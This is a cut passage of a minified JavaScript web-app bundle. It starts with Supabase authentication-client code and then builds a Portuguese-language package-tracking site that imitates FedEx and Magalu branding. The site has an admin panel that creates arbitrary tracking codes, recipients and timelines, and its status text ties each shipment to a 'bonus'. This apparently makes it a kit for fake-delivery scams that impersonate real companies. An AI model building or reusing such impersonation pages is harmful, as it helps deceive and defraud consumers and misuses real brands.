stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const e=Date.now();try{return await this._useSession(async t=>{const{data:{session:n}}=t;if(!n||!n.refresh_token||!n.expires_at)return void this._debug("#_autoRefreshTokenTick()","no session");const r=Math.floor((1e3*n.expires_at-e)/An);this._debug("#_autoRefreshTokenTick()","access token expires in ".concat(r," ticks, a tick lasts ").concat(An,"ms, refresh threshold is ").concat(3," ticks")),r<=3&&await this._callRefreshToken(n.refresh_token)})}catch(Oa){console.error("Auto refresh tick failed with error. This is likely a transient error.",Oa)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(Oa){if(!(Oa.isAcquireTimeout||Oa instanceof Vr))throw Oa;this._debug("auto refresh token tick lock not available")}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!dr()||!(null===window||void 0===window?void 0:window.addEventListener))return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>{try{await this._onVisibilityChanged(!1)}catch(e){this._debug("#visibilityChangedCallback","error",e)}},null===window||void 0===window||window.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(e){console.error("_handleVisibilityChange",e)}}async _onVisibilityChanged(e){const t="#_onVisibilityChanged(".concat(e,")");this._debug(t,"visibilityState",document.visibilityState),"visible"===document.visibilityState?(this.autoRefreshToken&&this._startAutoRefresh(),e||(await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>{"visible"===document.visibilityState?await this._recoverAndRefresh():this._debug(t,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting")}))):"hidden"===document.visibilityState&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(e,t,n){const r=["provider=".concat(encodeURIComponent(t))];if((null===n||void 0===n?void 0:n.redirectTo)&&r.push("redirect_to=".concat(encodeURIComponent(n.redirectTo))),(null===n||void 0===n?void 0:n.scopes)&&r.push("scopes=".concat(encodeURIComponent(n.scopes))),"pkce"===this.flowType){const[e,t]=await kr(this.storage,this.storageKey),n=new URLSearchParams({code_challenge:"".concat(encodeURIComponent(e)),code_challenge_method:"".concat(encodeURIComponent(t))});r.push(n.toString())}if(null===n||void 0===n?void 0:n.queryParams){const e=new URLSearchParams(n.queryParams);r.push(e.toString())}return(null===n||void 0===n?void 0:n.skipBrowserRedirect)&&r.push("skip_http_redirect=".concat(n.skipBrowserRedirect)),"".concat(e,"?").concat(r.join("&"))}async _unenroll(e){try{return await this._useSession(async t=>{var n;const{data:r,error:a}=t;return a?this._returnResult({data:null,error:a}):await Pr(this.fetch,"DELETE","".concat(this.url,"/factors/").concat(e.factorId),{headers:this.headers,jwt:null===(n=null===r||void 0===r?void 0:r.session)||void 0===n?void 0:n.access_token})})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}}async _enroll(e){try{return await this._useSession(async t=>{var n,r;const{data:a,error:s}=t;if(s)return this._returnResult({data:null,error:s});const o=Object.assign({friendly_name:e.friendlyName,factor_type:e.factorType},"phone"===e.factorType?{phone:e.phone}:"totp"===e.factorType?{issuer:e.issuer}:{}),{data:i,error:l}=await Pr(this.fetch,"POST","".concat(this.url,"/factors"),{body:o,headers:this.headers,jwt:null===(n=null===a||void 0===a?void 0:a.session)||void 0===n?void 0:n.access_token});return l?this._returnResult({data:null,error:l}):("totp"===e.factorType&&"totp"===i.type&&(null===(r=null===i||void 0===i?void 0:i.totp)||void 0===r?void 0:r.qr_code)&&(i.totp.qr_code="data:image/svg+xml;utf-8,".concat(i.totp.qr_code)),this._returnResult({data:i,error:null}))})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}}async _verify(e){return this._acquireLock(this.lockAcquireTimeout,async()=>{try{return await this._useSession(async t=>{var n;const{data:r,error:a}=t;if(a)return this._returnResult({data:null,error:a});const s=Object.assign({challenge_id:e.challengeId},"webauthn"in e?{webauthn:Object.assign(Object.assign({},e.webauthn),{credential_response:"create"===e.webauthn.type?ea(e.webauthn.credential_response):ta(e.webauthn.credential_response)})}:{code:e.code}),{data:o,error:i}=await Pr(this.fetch,"POST","".concat(this.url,"/factors/").concat(e.factorId,"/verify"),{body:s,headers:this.headers,jwt:null===(n=null===r||void 0===r?void 0:r.session)||void 0===n?void 0:n.access_token});return i?this._returnResult({data:null,error:i}):(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+o.expires_in},o)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",o),this._returnResult({data:o,error:i}))})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}})}async _challenge(e){return this._acquireLock(this.lockAcquireTimeout,async()=>{try{return await this._useSession(async t=>{var n;const{data:r,error:a}=t;if(a)return this._returnResult({data:null,error:a});const s=await Pr(this.fetch,"POST","".concat(this.url,"/factors/").concat(e.factorId,"/challenge"),{body:e,headers:this.headers,jwt:null===(n=null===r||void 0===r?void 0:r.session)||void 0===n?void 0:n.access_token});if(s.error)return s;const{data:o}=s;if("webauthn"!==o.type)return{data:o,error:null};switch(o.webauthn.type){case"create":return{data:Object.assign(Object.assign({},o),{webauthn:Object.assign(Object.assign({},o.webauthn),{credential_options:Object.assign(Object.assign({},o.webauthn.credential_options),{publicKey:Xr(o.webauthn.credential_options.publicKey)})})}),error:null};case"request":return{data:Object.assign(Object.assign({},o),{webauthn:Object.assign(Object.assign({},o.webauthn),{credential_options:Object.assign(Object.assign({},o.webauthn.credential_options),{publicKey:Zr(o.webauthn.credential_options.publicKey)})})}),error:null}}})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}})}async _challengeAndVerify(e){const{data:t,error:n}=await this._challenge({factorId:e.factorId});return n?this._returnResult({data:null,error:n}):await this._verify({factorId:e.factorId,challengeId:t.id,code:e.code})}async _listFactors(){var e;const{data:{user:t},error:n}=await this.getUser();if(n)return{data:null,error:n};const r={all:[],phone:[],totp:[],webauthn:[]};for(const a of null!==(e=null===t||void 0===t?void 0:t.factors)&&void 0!==e?e:[])r.all.push(a),"verified"===a.status&&r[a.factor_type].push(a);return{data:r,error:null}}async _getAuthenticatorAssuranceLevel(e){var t,n,r,a;if(e)try{const{payload:r}=br(e);let a=null;r.aal&&(a=r.aal);let s=a;const{data:{user:o},error:i}=await this.getUser(e);if(i)return this._returnResult({data:null,error:i});(null!==(n=null===(t=null===o||void 0===o?void 0:o.factors)||void 0===t?void 0:t.filter(e=>"verified"===e.status))&&void 0!==n?n:[]).length>0&&(s="aal2");return{data:{currentLevel:a,nextLevel:s,currentAuthenticationMethods:r.amr||[]},error:null}}catch(u){if(Bn(u))return this._returnResult({data:null,error:u});throw u}const{data:{session:s},error:o}=await this.getSession();if(o)return this._returnResult({data:null,error:o});if(!s)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const{payload:i}=br(s.access_token);let l=null;i.aal&&(l=i.aal);let c=l;(null!==(a=null===(r=s.user.factors)||void 0===r?void 0:r.filter(e=>"verified"===e.status))&&void 0!==a?a:[]).length>0&&(c="aal2");return{data:{currentLevel:l,nextLevel:c,currentAuthenticationMethods:i.amr||[]},error:null}}async _getAuthorizationDetails(e){try{return await this._useSession(async t=>{const{data:{session:n},error:r}=t;return r?this._returnResult({data:null,error:r}):n?await Pr(this.fetch,"GET","".concat(this.url,"/oauth/authorizations/").concat(e),{headers:this.headers,jwt:n.access_token,xform:e=>({data:e,error:null})}):this._returnResult({data:null,error:new Wn})})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}}async _approveAuthorization(e,t){try{return await this._useSession(async n=>{const{data:{session:r},error:a}=n;if(a)return this._returnResult({data:null,error:a});if(!r)return this._returnResult({data:null,error:new Wn});const s=await Pr(this.fetch,"POST","".concat(this.url,"/oauth/authorizations/").concat(e,"/consent"),{headers:this.headers,jwt:r.access_token,body:{action:"approve"},xform:e=>({data:e,error:null})});return s.data&&s.data.redirect_url&&dr()&&!(null===t||void 0===t?void 0:t.skipBrowserRedirect)&&window.location.assign(s.data.redirect_url),s})}catch(n){if(Bn(n))return this._returnResult({data:null,error:n});throw n}}async _denyAuthorization(e,t){try{return await this._useSession(async n=>{const{data:{session:r},error:a}=n;if(a)return this._returnResult({data:null,error:a});if(!r)return this._returnResult({data:null,error:new Wn});const s=await Pr(this.fetch,"POST","".concat(this.url,"/oauth/authorizations/").concat(e,"/consent"),{headers:this.headers,jwt:r.access_token,body:{action:"deny"},xform:e=>({data:e,error:null})});return s.data&&s.data.redirect_url&&dr()&&!(null===t||void 0===t?void 0:t.skipBrowserRedirect)&&window.location.assign(s.data.redirect_url),s})}catch(n){if(Bn(n))return this._returnResult({data:null,error:n});throw n}}async _listOAuthGrants(){try{return await this._useSession(async e=>{const{data:{session:t},error:n}=e;return n?this._returnResult({data:null,error:n}):t?await Pr(this.fetch,"GET","".concat(this.url,"/user/oauth/grants"),{headers:this.headers,jwt:t.access_token,xform:e=>({data:e,error:null})}):this._returnResult({data:null,error:new Wn})})}catch(e){if(Bn(e))return this._returnResult({data:null,error:e});throw e}}async _revokeOAuthGrant(e){try{return await this._useSession(async t=>{const{data:{session:n},error:r}=t;return r?this._returnResult({data:null,error:r}):n?(await Pr(this.fetch,"DELETE","".concat(this.url,"/user/oauth/grants"),{headers:this.headers,jwt:n.access_token,query:{client_id:e.clientId},noResolveJson:!0}),{data:{},error:null}):this._returnResult({data:null,error:new Wn})})}catch(t){if(Bn(t))return this._returnResult({data:null,error:t});throw t}}async fetchJwk(e){let t=(arguments.length>1&&void 0!==arguments[1]?arguments[1]:{keys:[]}).keys.find(t=>t.kid===e);if(t)return t;const n=Date.now();if(t=this.jwks.keys.find(t=>t.kid===e),t&&this.jwks_cached_at+6e5>n)return t;const{data:r,error:a}=await Pr(this.fetch,"GET","".concat(this.url,"/.well-known/jwks.json"),{headers:this.headers});if(a)throw a;return r.keys&&0!==r.keys.length?(this.jwks=r,this.jwks_cached_at=n,t=r.keys.find(t=>t.kid===e),t||null):null}async getClaims(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};try{let n=e;if(!n){const{data:e,error:t}=await this.getSession();if(t||!e.session)return this._returnResult({data:null,error:t});n=e.session.access_token}const{header:r,payload:a,signature:s,raw:{header:o,payload:i}}=br(n);(null===t||void 0===t?void 0:t.allowExpired)||function(e){if(!e)throw new Error("Missing exp claim");if(e<=Math.floor(Date.now()/1e3))throw new Error("JWT has expired")}(a.exp);const l=r.alg&&!r.alg.startsWith("HS")&&r.kid&&"crypto"in globalThis&&"subtle"in globalThis.crypto?await this.fetchJwk(r.kid,(null===t||void 0===t?void 0:t.keys)?{keys:t.keys}:null===t||void 0===t?void 0:t.jwks):null;if(!l){const{error:e}=await this.getUser(n);if(e)throw e;return{data:{claims:a,header:r,signature:s},error:null}}const c=function(e){switch(e){case"RS256":return{name:"RSASSA-PKCS1-v1_5",hash:{name:"SHA-256"}};case"ES256":return{name:"ECDSA",namedCurve:"P-256",hash:{name:"SHA-256"}};default:throw new Error("Invalid alg claim")}}(r.alg),u=await crypto.subtle.importKey("jwk",l,c,!0,["verify"]);if(!await crypto.subtle.verify(c,u,s,function(e){const t=[];return lr(e,e=>t.push(e)),new Uint8Array(t)}("".concat(o,".").concat(i))))throw new er("Invalid JWT signature");return{data:{claims:a,header:r,signature:s},error:null}}catch(n){if(Bn(n))return this._returnResult({data:null,error:n});throw n}}}da.nextInstanceID={};const ha=da;let fa="";fa="undefined"!==typeof Deno?"deno":"undefined"!==typeof document?"web":"undefined"!==typeof navigator&&"ReactNative"===navigator.product?"react-native":"node";const pa={headers:{"X-Client-Info":"supabase-js-".concat(fa,"/").concat("2.97.0")}},ma={schema:"public"},ga={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},va={};function ya(e){return(ya="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function ba(e){var t=function(e,t){if("object"!=ya(e)||!e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var r=n.call(e,t||"default");if("object"!=ya(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}(e,"string");return"symbol"==ya(t)?t:t+""}function wa(e,t,n){return(t=ba(t))in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function _a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),n.push.apply(n,r)}return n}function ka(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?_a(Object(n),!0).forEach(function(t){wa(e,t,n[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):_a(Object(n)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))})}return e}const xa=(e,t,n)=>{const r=(e=>e?function(){return e(...arguments)}:function(){return fetch(...arguments)})(n),a=Headers;return async(n,s)=>{var o;const i=null!==(o=await t())&&void 0!==o?o:e;let l=new a(null===s||void 0===s?void 0:s.headers);return l.has("apikey")||l.set("apikey",e),l.has("Authorization")||l.set("Authorization","Bearer ".concat(i)),r(n,ka(ka({},s),{},{headers:l}))}};var Sa=class extends ha{constructor(e){super(e)}},Ea=class{constructor(e,t,n){var r,a;this.supabaseUrl=e,this.supabaseKey=t;const s=function(e){const t=null===e||void 0===e?void 0:e.trim();if(!t)throw new Error("supabaseUrl is required.");if(!t.match(/^https?:\/\//i))throw new Error("Invalid supabaseUrl: Must be a valid HTTP or HTTPS URL.");try{return new URL((n=t).endsWith("/")?n:n+"/")}catch(r){throw Error("Invalid supabaseUrl: Provided URL is malformed.")}var n}(e);if(!t)throw new Error("supabaseKey is required.");this.realtimeUrl=new URL("realtime/v1",s),this.realtimeUrl.protocol=this.realtimeUrl.protocol.replace("http","ws"),this.authUrl=new URL("auth/v1",s),this.storageUrl=new URL("storage/v1",s),this.functionsUrl=new URL("functions/v1",s);const o="sb-".concat(s.hostname.split(".")[0],"-auth-token"),i=function(e,t){var n,r;const{db:a,auth:s,realtime:o,global:i}=e,{db:l,auth:c,realtime:u,global:d}=t,h={db:ka(ka({},l),a),auth:ka(ka({},c),s),realtime:ka(ka({},u),o),storage:{},global:ka(ka(ka({},d),i),{},{headers:ka(ka({},null!==(n=null===d||void 0===d?void 0:d.headers)&&void 0!==n?n:{}),null!==(r=null===i||void 0===i?void 0:i.headers)&&void 0!==r?r:{})}),accessToken:async()=>""};return e.accessToken?h.accessToken=e.accessToken:delete h.accessToken,h}(null!==n&&void 0!==n?n:{},{db:ma,realtime:va,auth:ka(ka({},ga),{},{storageKey:o}),global:pa});var l;(this.storageKey=null!==(r=i.auth.storageKey)&&void 0!==r?r:"",this.headers=null!==(a=i.global.headers)&&void 0!==a?a:{},i.accessToken)?(this.accessToken=i.accessToken,this.auth=new Proxy({},{get:(e,t)=>{throw new Error("@supabase/supabase-js: Supabase Client is configured with the accessToken option, accessing supabase.auth.".concat(String(t)," is not possible"))}})):this.auth=this._initSupabaseAuthClient(null!==(l=i.auth)&&void 0!==l?l:{},this.headers,i.global.fetch);this.fetch=xa(t,this._getAccessToken.bind(this),i.global.fetch),this.realtime=this._initRealtimeClient(ka({headers:this.headers,accessToken:this._getAccessToken.bind(this)},i.realtime)),this.accessToken&&Promise.resolve(this.accessToken()).then(e=>this.realtime.setAuth(e)).catch(e=>console.warn("Failed to set initial Realtime auth token:",e)),this.rest=new Xe(new URL("rest/v1",s).href,{headers:this.headers,schema:i.db.schema,fetch:this.fetch,timeout:i.db.timeout,urlLengthLimit:i.db.urlLengthLimit}),this.storage=new Pn(this.storageUrl.href,this.headers,this.fetch,null===n||void 0===n?void 0:n.storage),i.accessToken||this._listenForAuthEvents()}get functions(){return new Be(this.functionsUrl.href,{headers:this.headers,customFetch:this.fetch})}from(e){return this.rest.from(e)}schema(e){return this.rest.schema(e)}rpc(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{head:!1,get:!1,count:void 0};return this.rest.rpc(e,t,n)}channel(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{config:{}};return this.realtime.channel(e,t)}getChannels(){return this.realtime.getChannels()}removeChannel(e){return this.realtime.removeChannel(e)}removeAllChannels(){return this.realtime.removeAllChannels()}async _getAccessToken(){var e,t,n=this;if(n.accessToken)return await n.accessToken();const{data:r}=await n.auth.getSession();return null!==(e=null===(t=r.session)||void 0===t?void 0:t.access_token)&&void 0!==e?e:n.supabaseKey}_initSupabaseAuthClient(e,t,n){let{autoRefreshToken:r,persistSession:a,detectSessionInUrl:s,storage:o,userStorage:i,storageKey:l,flowType:c,lock:u,debug:d,throwOnError:h}=e;const f={Authorization:"Bearer ".concat(this.supabaseKey),apikey:"".concat(this.supabaseKey)};return new Sa({url:this.authUrl.href,headers:ka(ka({},f),t),storageKey:l,autoRefreshToken:r,persistSession:a,detectSessionInUrl:s,storage:o,userStorage:i,flowType:c,lock:u,debug:d,throwOnError:h,fetch:n,hasCustomAuthorizationHeader:Object.keys(this.headers).some(e=>"authorization"===e.toLowerCase())})}_initRealtimeClient(e){return new It(this.realtimeUrl.href,ka(ka({},e),{},{params:ka(ka({},{apikey:this.supabaseKey}),null===e||void 0===e?void 0:e.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((e,t)=>{this._handleTokenChanged(e,"CLIENT",null===t||void 0===t?void 0:t.access_token)})}_handleTokenChanged(e,t,n){"TOKEN_REFRESHED"!==e&&"SIGNED_IN"!==e||this.changedAccessToken===n?"SIGNED_OUT"===e&&(this.realtime.setAuth(),"STORAGE"==t&&this.auth.signOut(),this.changedAccessToken=void 0):(this.changedAccessToken=n,this.realtime.setAuth(n))}};(function(){if("undefined"!==typeof window)return!1;const e=globalThis.process;if(!e)return!1;const t=e.version;if(void 0===t||null===t)return!1;const n=t.match(/^v(\d+)\./);return!!n&&parseInt(n[1],10)<=18})()&&console.warn("\u26a0\ufe0f  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217");const ja=((e,t,n)=>new Ea(e,t,n))("https://uarixbnkdvlnpcxpnqtt.supabase.co","sb_publishable_fF-HqzS9k_4UsFGEQ0u9MA_HG2GRO9-"),Ta=()=>{const{trackingCode:e}=function(){let{matches:e}=a.useContext(X),t=e[e.length-1];return t?t.params:{}}(),t=re(),[n,r]=(0,a.useState)(null),[s,o]=(0,a.useState)(!1);if((0,a.useEffect)(()=>{document.title="FedEx - Rastreamento de Pedido"},[]),(0,a.useEffect)(()=>{(async()=>{const t=e.toUpperCase();console.log("Carregando dados do rastreamento:",t);try{const{data:e,error:n}=await ja.from("trackings").select("*").eq("code",t).maybeSingle();if(console.log("Resultado da busca no Supabase:",{data:e,error:n}),e&&e.code){console.log("Dados encontrados no Supabase!");const t={trackingCode:e.code||e.trackingCode,recipientName:e.recipient_name||e.recipientName,address:e.address,lastUpdate:e.last_update||e.lastUpdate,timeline:e.timeline,status:e.status};return void r(t)}console.log("Tentando buscar no localStorage...");const a=localStorage.getItem("tracking_".concat(t));if(a)try{const e=JSON.parse(a);console.log("Dados encontrados no localStorage! Migrando para Supabase...");const n={code:t,recipient_name:e.recipientName||e.recipient_name||"",address:e.address||"",last_update:e.lastUpdate||e.last_update||(new Date).toISOString(),timeline:e.timeline||[],status:e.status||"postado",is_verified:void 0!==e.verified?e.verified:void 0!==e.is_verified&&e.is_verified,cep:e.cep||null};return ja.from("trackings").upsert([n],{onConflict:"code"}).then(e=>{let{error:t}=e;t?console.error("Erro ao migrar para Supabase:",t):console.log("\u2705 Dados migrados para Supabase com sucesso!")}).catch(e=>{console.error("Erro ao migrar:",e)}),void r(e)}catch(Oa){console.error("Erro ao carregar dados de rastreamento:",Oa)}console.log("Rastreamento n\xe3o encontrado - exibindo p\xe1gina com c\xf3digo digitado"),r({trackingCode:t,recipientName:"N\xe3o encontrado",address:"N\xe3o encontrado",lastUpdate:(new Date).toISOString(),timeline:[],status:"n\xe3o encontrado"})}catch(n){console.error("Erro ao carregar dados de rastreamento:",n);const e=localStorage.getItem("tracking_".concat(t));if(e)try{const t=JSON.parse(e);return void r(t)}catch(Oa){console.error("Erro ao carregar dados locais:",Oa)}console.log("Erro ao carregar - exibindo p\xe1gina com c\xf3digo digitado"),r({trackingCode:t,recipientName:"Erro ao carregar",address:"Erro ao carregar",lastUpdate:(new Date).toISOString(),timeline:[],status:"erro"})}})()},[e,t]),!n)return(0,Te.jsx)("div",{className:"tracking-container",children:(0,Te.jsx)("div",{className:"tracking-loading",children:"Carregando informa\xe7\xf5es do rastreamento..."})});const i=n||{trackingCode:e.toUpperCase(),recipientName:"N\xe3o encontrado",address:"N\xe3o encontrado",lastUpdate:(new Date).toISOString(),timeline:[],status:"n\xe3o encontrado"},l=e=>{if(!e)return"";return new Date(e).toLocaleDateString("pt-BR",{day:"2-digit",month:"2-digit",year:"numeric"})},c=e=>{if(!e)return"";return new Date(e).toLocaleDateString("pt-BR",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit"})};return(0,Te.jsxs)("div",{className:"tracking-container",children:[(0,Te.jsx)("div",{className:"tracking-header",children:(0,Te.jsx)("div",{className:"tracking-logo",children:s?(0,Te.jsx)("div",{className:"logo-text",children:(0,Te.jsx)("span",{className:"logo-name",children:"FedEx"})}):(0,Te.jsx)("img",{src:"/fedex.png",alt:"FedEx",className:"tracking-header-logo",onError:()=>o(!0)})})}),(0,Te.jsxs)("div",{className:"tracking-content",children:[(0,Te.jsxs)("div",{className:"tracking-main-card",children:[(0,Te.jsx)("h2",{className:"tracking-code-label",children:"Seu c\xf3digo de rastreamento \xe9"}),(0,Te.jsx)("div",{className:"tracking-code",children:i.trackingCode||e.toUpperCase()}),"n\xe3o encontrado"===i.status||"erro"===i.status?(0,Te.jsxs)("div",{className:"tracking-error-message",children:[(0,Te.jsx)("div",{className:"error-icon",children:"\u26a0\ufe0f"}),(0,Te.jsx)("h3",{className:"error-title",children:"C\xf3digo de rastreamento n\xe3o encontrado"}),(0,Te.jsxs)("p",{className:"error-text",children:["O c\xf3digo ",(0,Te.jsx)("strong",{children:i.trackingCode||e.toUpperCase()})," n\xe3o foi encontrado em nosso sistema."]}),(0,Te.jsx)("p",{className:"error-text",children:"Verifique se o c\xf3digo est\xe1 correto ou entre em contato com o suporte."})]}):(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsx)("div",{className:"tracking-info-section",children:(0,Te.jsxs)("div",{className:"tracking-info-item",children:[(0,Te.jsx)("span",{className:"info-label",children:"Destinat\xe1rio:"}),(0,Te.jsx)("span",{className:"info-value",children:i.recipientName||"N/A"})]})}),(0,Te.jsxs)("div",{className:"tracking-address-section",children:[(0,Te.jsxs)("div",{className:"address-header",children:[(0,Te.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"#666",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("path",{d:"M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"}),(0,Te.jsx)("circle",{cx:"12",cy:"10",r:"3"})]}),(0,Te.jsx)("span",{className:"address-label",children:"Endere\xe7o de Entrega:"})]}),(0,Te.jsx)("div",{className:"address-value",children:i.address||"Endere\xe7o n\xe3o informado"})]}),(0,Te.jsxs)("div",{className:"tracking-update-bar",children:["\xdaltima atualiza\xe7\xe3o em: ",l(i.lastUpdate||(new Date).toISOString())]})]})]}),(0,Te.jsxs)("div",{className:"tracking-help-card",children:[(0,Te.jsx)("h3",{className:"help-title",children:"Precisa de Ajuda?"}),(0,Te.jsxs)("button",{className:"help-button support",children:[(0,Te.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("path",{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"}),(0,Te.jsx)("path",{d:"M13 8H7"}),(0,Te.jsx)("path",{d:"M17 12H7"})]}),"Falar com Suporte"]}),(0,Te.jsxs)("button",{className:"help-button faq",children:[(0,Te.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,Te.jsx)("path",{d:"M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"}),(0,Te.jsx)("line",{x1:"12",y1:"17",x2:"12.01",y2:"17"})]}),"Perguntas Frequentes"]})]}),(0,Te.jsx)("div",{className:"tracking-timeline",children:i.timeline&&i.timeline.length>0?i.timeline.map((e,t)=>{const n=t===i.timeline.length-1;return(0,Te.jsxs)("div",{className:"timeline-item ".concat(n?"active":""),children:[(0,Te.jsx)("div",{className:"timeline-dot"}),(0,Te.jsxs)("div",{className:"timeline-content",children:[(0,Te.jsx)("div",{className:"timeline-date",children:e.dateTime?c(e.dateTime):l(e.date)}),(0,Te.jsx)("div",{className:"timeline-status",children:e.status}),(0,Te.jsx)("div",{className:"timeline-description",children:e.description}),e.location&&(0,Te.jsxs)("div",{className:"timeline-location",children:[(0,Te.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"#666",strokeWidth:"2",children:[(0,Te.jsx)("path",{d:"M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"}),(0,Te.jsx)("circle",{cx:"12",cy:"10",r:"3"})]}),e.location]}),e.sector&&(0,Te.jsxs)("div",{className:"timeline-sector",children:[(0,Te.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"#4D148C",strokeWidth:"2",children:[(0,Te.jsx)("rect",{x:"3",y:"3",width:"18",height:"18",rx:"2",ry:"2"}),(0,Te.jsx)("line",{x1:"9",y1:"9",x2:"15",y2:"9"}),(0,Te.jsx)("line",{x1:"9",y1:"15",x2:"15",y2:"15"})]}),"Setor: ",e.sector]})]})]},t)}):(0,Te.jsxs)("div",{className:"timeline-item active",children:[(0,Te.jsx)("div",{className:"timeline-dot"}),(0,Te.jsxs)("div",{className:"timeline-content",children:[(0,Te.jsx)("div",{className:"timeline-date",children:l((new Date).toISOString())}),(0,Te.jsx)("div",{className:"timeline-status",children:"Seu pacote foi postado"}),(0,Te.jsx)("div",{className:"timeline-description",children:"Objeto postado ap\xf3s a bonifica\xe7\xe3o"})]})]})})]}),(0,Te.jsx)("div",{className:"tracking-logos",children:s?(0,Te.jsxs)("div",{className:"tracking-logos-fallback",children:[(0,Te.jsx)("span",{children:"Magalu"}),(0,Te.jsx)("span",{children:"FedEx"})]}):(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsx)("img",{src:"/logo-magalu-azul (1).png",alt:"Magalu",className:"tracking-logo-magalu",onError:()=>o(!0)}),(0,Te.jsx)("a",{href:"https://www.fedex.com/pt-br/shipping/rates/last-minute-rates.html?cmp=KNC-1009085-3-1-950-1000000-LAC-BR-ES-SearchKeywords&gclsrc=aw.ds&gad_source=1&gad_campaignid=23175507727&gbraid=0AAAAADlsr1bNoztKIG9t2R09WvnSVhiGt&gclid=Cj0KCQiA7-rMBhCFARIsAKnLKtCtAoTL6GnNuTgBOC53MPzTNyVE9cgPriWYti1fJFmH3OCG3Ug0F3kaArPQEALw_wcB",target:"_blank",rel:"noopener noreferrer",style:{display:"inline-block"},children:(0,Te.jsx)("img",{src:"/fedex.png",alt:"FedEx",className:"tracking-logo-fedex",onError:()=>o(!0)})})]})})]})},Ca=()=>{const[e,t]=(0,a.useState)(!1),[n,r]=(0,a.useState)(""),[s,o]=(0,a.useState)(""),[i,l]=(0,a.useState)([]),[c,u]=(0,a.useState)(!1),[d,h]=(0,a.useState)({trackingCode:"",recipientName:"",cep:"",address:"",addressNumber:"",status:"postado",description:"Objeto postado ap\xf3s a bonifica\xe7\xe3o",location:"",date:(new Date).toISOString().split("T")[0]}),[f,p]=(0,a.useState)(!1),m=re();(0,a.useEffect)(()=>{document.title="FedEx - \xc1rea Administrativa"},[]),(0,a.useEffect)(()=>{"true"===sessionStorage.getItem("admin_authenticated")&&(t(!0),g())},[]),(0,a.useEffect)(()=>{if(c&&!d.trackingCode){const e=y();h(t=>zt(zt({},t),{},{trackingCode:e}))}},[c]);const g=async()=>{try{const{data:e,error:t}=await ja.from("trackings").select("*").order("created_at",{ascending:!1});if(t){console.error("Erro ao carregar rastreamentos:",t);const e=[];for(let t=0;t<localStorage.length;t++){const n=localStorage.key(t);if(n&&n.startsWith("tracking_"))try{const t=JSON.parse(localStorage.getItem(n));e.push(zt({code:n.replace("tracking_","")},t))}catch(Oa){console.error("Erro ao carregar rastreamento:",Oa)}}return void l(e)}const n=(e||[]).map(e=>zt({code:e.code||e.trackingCode,recipientName:e.recipient_name||e.recipientName,address:e.address,lastUpdate:e.last_update||e.lastUpdate,timeline:e.timeline,status:e.status,verified:void 0!==e.is_verified?e.is_verified:e.verified},e)),r=[];for(let s=0;s<localStorage.length;s++){const e=localStorage.key(s);if(e&&e.startsWith("tracking_")){const 